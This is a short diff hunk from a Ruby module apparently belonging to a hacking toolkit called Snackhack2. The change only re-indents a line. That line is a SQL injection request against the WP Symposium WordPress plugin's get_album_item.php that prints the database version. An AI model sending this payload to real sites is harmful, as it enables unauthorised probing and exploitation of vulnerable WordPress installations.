@@ -11,7 +11,7 @@ module Snackhack2
 
     def run
       wp = Snackhack2::get(File.join(@site,
-                                  '/wp-content/plugins/wp-symposium/get_album_item.php?size=version%28%29%20;%20--'))
+                                     '/wp-content/plugins/wp-symposium/get_album_item.php?size=version%28%29%20;%20--'))
       if wp.code == 200
         puts wp.body
       else
